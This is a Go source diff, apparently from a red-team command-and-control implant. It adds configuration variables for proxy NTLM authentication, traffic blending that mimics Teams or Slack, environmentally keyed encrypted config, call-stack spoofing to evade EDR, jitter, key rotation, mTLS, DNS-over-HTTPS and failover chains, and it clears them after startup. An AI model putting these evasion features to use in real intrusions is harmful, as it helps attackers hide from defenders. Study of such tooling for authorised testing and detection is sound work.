@@ -22,10 +22,14 @@ var (
 	postURI        string = "/data"
 	hostHeader     string = ""     // Override Host header for domain fronting
 	proxyURL       string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
+	proxyUser      string = ""     // Proxy authentication username
+	proxyPass      string = ""     // Proxy authentication password
+	proxyDomain    string = ""     // Proxy NTLM domain (triggers NTLM auth when set)
 	tlsVerify      string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
 	tlsFingerprint string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
 	fallbackHosts  string = ""     // Comma-separated fallback C2 URLs for automatic failover
 	contentTypes   string = ""     // Comma-separated Content-Type values for request rotation
+	trafficProfile string = ""     // Traffic blending profile: teams, slack, onedrive (empty = generic)
 	// bodyTransforms removed: use httpx C2 profile for malleable transforms
 	workingHoursStart      string = "" // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd        string = "" // Working hours end (HH:MM, 24hr local time)
@@ -36,6 +40,8 @@ var (
 	envKeyDomain           string = "" // Environment key: domain must match this regex
 	envKeyUsername         string = "" // Environment key: username must match this regex
 	envKeyProcess          string = "" // Environment key: this process must be running
+	envKeyDerive           string = "" // Environmental keying method: hostname, domain, username, hostname+domain, hostname+domain+username
+	envDerivedBlob         string = "" // Base64 AES-GCM encrypted config blob (keyed to host environment)
 	selfDelete             string = "" // Self-delete binary from disk after execution starts
 	masqueradeName         string = "" // Process name masquerade (Linux: prctl PR_SET_NAME)
 	customHeaders          string = "" // Base64-encoded JSON of additional HTTP headers
@@ -46,6 +52,8 @@ var (
 	sandboxGuard           string = "" // Detect sleep skipping (sandbox fast-forward) and exit silently
 	sleepMask              string = "" // Encrypt sensitive agent/C2 data in memory during sleep cycles
 	sleepGuardPages        string = "" // VirtualProtect PAGE_NOACCESS on vault pages during sleep (Windows only)
+	stackSpoof             string = "" // Spoof call stack during sleep to evade EDR thread scanners (Windows only)
+	jitterProfile          string = "" // Adaptive jitter profile: uniform, normal, exponential (empty = uniform)
 	discordBotToken        string = "" // Discord bot token for Discord C2 profile
 	discordChannelID       string = "" // Discord channel ID for Discord C2 profile
 	discordPollDelay       string = "" // Seconds between Discord message polls (default: 10)
@@ -55,6 +63,13 @@ var (
 	httpxRotation          string = "" // httpx domain rotation: fail-over, round-robin, random
 	httpxFailoverThreshold string = "" // httpx failover threshold (consecutive failures before switching)
 	recoveryInterval       string = "" // Seconds between recovery attempts for unhealthy C2 domains (default: 600)
+	keyRotationInterval    string = "" // Check-ins between ECDH key rotations (0 = disabled)
+	mtlsCertPEM            string = "" // Base64-encoded PEM client certificate for mutual TLS authentication
+	mtlsKeyPEM             string = "" // Base64-encoded PEM client private key for mutual TLS authentication
+	dohResolver            string = "" // DNS-over-HTTPS provider for all agent DNS: cloudflare, google, quad9, or custom URL
+	failoverChain          string = "" // Ordered failover profiles: e.g., "http,discord" (empty = single profile)
+	failoverThreshold      string = "" // Consecutive failures before switching profile (default: 5)
+	failoverRecovery       string = "" // Seconds between primary recovery attempts when on backup (default: 300)
 )
 
 // clearGlobals zeros out ALL build-time global variables after they have been
@@ -74,12 +89,16 @@ func clearGlobals() {
 	postURI = ""
 	hostHeader = ""
 	proxyURL = ""
+	proxyUser = ""
+	proxyPass = ""
+	proxyDomain = ""
 	customHeaders = ""
 	xorKey = ""
 	tlsVerify = ""
 	tlsFingerprint = ""
 	fallbackHosts = ""
 	contentTypes = ""
+	trafficProfile = ""
 	tcpBindAddress = ""
 	namedPipeBindName = ""
 	discordBotToken = ""
@@ -91,6 +110,7 @@ func clearGlobals() {
 	httpxRotation = ""
 	httpxFailoverThreshold = ""
 	recoveryInterval = ""
+	keyRotationInterval = ""
 
 	// Operational parameters
 	sleepInterval = ""
@@ -108,6 +128,12 @@ func clearGlobals() {
 	envKeyDomain = ""
 	envKeyUsername = ""
 	envKeyProcess = ""
+	envKeyDerive = ""
+	envDerivedBlob = ""
+
+	// mTLS client certificates (reveal identity)
+	mtlsCertPEM = ""
+	mtlsKeyPEM = ""
 
 	// OPSEC feature flags (reveal agent capabilities)
 	selfDelete = ""
@@ -117,6 +143,12 @@ func clearGlobals() {
 	indirectSyscalls = ""
 	sandboxGuard = ""
 	sleepMask = ""
+	stackSpoof = ""
+	jitterProfile = ""
+	dohResolver = ""
+	failoverChain = ""
+	failoverThreshold = ""
+	failoverRecovery = ""
 }
 
 // xorDecodeString decodes a base64-encoded XOR-encrypted string.
